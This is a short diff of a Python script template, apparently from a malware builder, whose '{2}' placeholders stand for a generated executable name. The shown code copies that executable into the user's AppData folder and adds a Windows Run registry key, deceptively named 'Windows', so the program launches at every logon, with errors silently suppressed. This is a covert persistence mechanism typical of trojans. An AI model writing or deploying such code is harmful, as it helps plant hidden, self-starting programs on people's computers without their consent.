@@ -47,9 +47,9 @@ try:
 except Exception as e:
     None
 exe_name='{2}'
-exe_path = os.environ['appdata'] + "\\exe_name.exe"
+exe_path = os.environ['appdata'] + "\\{2}.exe"
 
-os.system("copy exe_name.exe" + exe_path + " /y")
+os.system("copy {2}.exe" + exe_path + " /y")
 os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Windows /t REG_SZ /d ' + exe_path+ " /f")
 
 
